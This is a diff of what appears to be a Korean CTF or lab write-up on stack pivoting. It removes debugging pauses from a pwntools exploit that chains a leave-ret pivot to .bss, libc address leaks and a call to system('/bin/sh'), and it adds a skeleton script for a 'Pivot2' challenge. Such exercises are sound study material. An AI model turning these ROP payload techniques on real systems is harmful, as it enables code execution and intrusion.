@@ -50,7 +50,6 @@ payload += p64(bss)
 payload += b'D'*32
 payload += p64(leave_ret)
 
-pause()
 p.send(payload)
 
 write_offset = libc.symbols['write']
@@ -70,7 +69,6 @@ payload += p64(binsh)
 payload += p64(0x004004c6) #ret sled
 payload += p64(system_addr)
 
-pause()
 p.send(payload)
 
 
@@ -83,6 +81,26 @@ p.interactive()
 
 ## 2 Pivot2
 
+Stack Pivoting을 이용하여 
+
+
+```python
+from pwn import *
+
+p = process('./pivot2')
+e = ELF('./pivot2')
+libc = e.libc
+
+
+bss = e.bss() + 0x400
+
+
+
+
+
+p.interactive()
+
+```
 
 
 
